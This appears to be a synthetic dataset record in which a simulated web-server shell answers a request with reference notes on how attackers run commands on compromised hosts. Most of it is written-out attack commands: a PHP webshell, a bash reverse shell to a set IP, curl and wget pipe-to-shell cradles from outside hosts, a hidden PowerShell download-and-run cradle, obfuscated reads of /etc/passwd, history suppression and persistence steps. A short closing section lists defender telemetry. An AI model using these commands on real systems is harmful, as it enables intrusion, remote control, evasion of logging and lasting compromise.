data.command: Describe how attackers run malicious commands via command-line interface

data.text:
webapp@web-srv-01:~$ Describe how attackers run malicious commands via command-line interface

ATTACKER COMMAND-LINE EXECUTION - REFERENCE NOTES

An attacker who reaches a shell on a host almost never uploads a single monolithic
"hack tool". The preferred method is to drive the target's own command-line
interpreter - bash, sh, dash, cmd.exe, PowerShell - because those binaries are
already trusted, already installed, and already allowed through most egress and
application-allowlist controls. Everything below is a variation on one theme:
get the shell, then make the shell do the work.

GAINING THE COMMAND LINE

The first job is turning a remote or web-facing vulnerability into an interactive
command channel. On Linux web servers the classic route is a file-upload or
deserialisation flaw in the application, followed by a one-line webshell that
passes input straight to the interpreter:

  <?php system($_GET['c']); ?>

Requesting /uploads/shell.php?c=id returns uid=33(www-data) ... which confirms the
process context the attacker is now speaking from. From there the attacker
immediately upgrades a dumb pipe into a real terminal:

  python3 -c 'import pty; pty.spawn("/bin/bash")'
  export TERM=xterm; stty raw -echo

The wrapper matters: it gives job control, arrow keys and tab completion, so the
remaining work can be scripted instead of typed blind.

REVERSE SHELLS AND EGRESS

If the inbound exploit gives no interactive channel, the target is told to call
home. Bash's built-in /dev/tcp redirection needs no extra tooling at all:

  bash -i >& /dev/tcp/10.0.0.91/4444 0>&1

Equivalent one-liners exist for nc, socat, perl, ruby, python and openssl, and
operators rotate through them because each produces a different process tree and
a different parent-child relationship in the logs. Ports are chosen to blend in -
443, 53, 8443 - and TLS-wrapped variants (openssl s_client, socat OPENSSL) hide
the payload from naive content inspection.

FILES ON DISK ARE AVOIDED

Modern tradecraft is "living off the land": use signed, pre-installed binaries as
the payload. curl and wget are staged against the interpreter rather than written
to a file, so nothing ever touches disk:

  curl -s http://cdn-metrics.corp-external.net/upd | bash
  wget -qO- https://raw.githubusercontent.com/x/y/main/p.sh | sh

The same pattern appears in PowerShell:

  powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://...')"

Base64, gzip, hex and certificates are used purely as transport encoding to slip
past signature matching and shell-metacharacter filtering.

COMMAND OBFUSCATION

Once inside, the attacker assumes the command line is logged (HISTFILE, auditd,
EDR process telemetry) and shapes the string accordingly. Common tricks:

  c=cat; $c /etc/passwd                  variable indirection
  c""at /etc/passwd                      empty quoting breaks substring rules
  /bin/c?t /etc/passwd                   globbing avoids literal binary names
  w\ho\am\i                              backslash insertion
  echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
  pr -t -e -n 20 /dev/urandom ...        IFS stuffing and whitespace padding

Chain operators are likewise chosen for effect, not readability - ';', '&&', '||'
and '|' shape whether the next stage runs only on success, which lets an operator
walk a list of fallbacks in one logged line.

INTERPRETER ABUSE

Where a network filter or application allowlist blocks curl/bash, the attacker
moves execution into whatever interpreter the host already uses. A single
permitted process can become a fully programmable execution engine:

  awk 'BEGIN {system("/bin/sh -c whoami")}'
  find / -exec /bin/sh -c 'id' \;
  tar --checkpoint=1 --checkpoint-action=exec=sh -c 'id'
  openssl enc -d -aes-256-cbc -in blob.enc | sh

Because the visible process is awk, find, tar or openssl, name-based alerting on
"bash" or "curl" is not enough - the detection has to look at the full argument
vector and at what the process eventually spawns.

SESSION SURVIVAL

Interactive shells die with the SSH connection, so the attacker detaches:

  nohup ./implant >/dev/null 2>&1 &
  setsid -f /tmp/.x/sync
  disown -h %1

together with history suppression:

  unset HISTFILE; export HISTSIZE=0; set +o history

or simply truncating the current session's history in place. Persistence is then
installed through the same primitives a legitimate administrator would use -
crontab entries, systemd timers, .bashrc and profile hooks, SSH authorized_keys,
or an extra file under /etc/ld.so.preload.

WHAT THE DEFENDER SHOULD COLLECT

Every one of these techniques leaves the same class of artifact: the parent
process, the full argv of the spawned interpreter, the destination IP of any
cradle, and the file descriptor state of any detaching process. syslog, auditd
EXECVE records, /var/log/auth.log, bash history files, and process accounting are
the places that evidence lives. Correlation between "who spawned a shell" and
"what that shell reached outward to" is the highest-value signal - the shell
itself is unremarkable; the shell with a /dev/tcp redirect and no matching
deployment window is not.
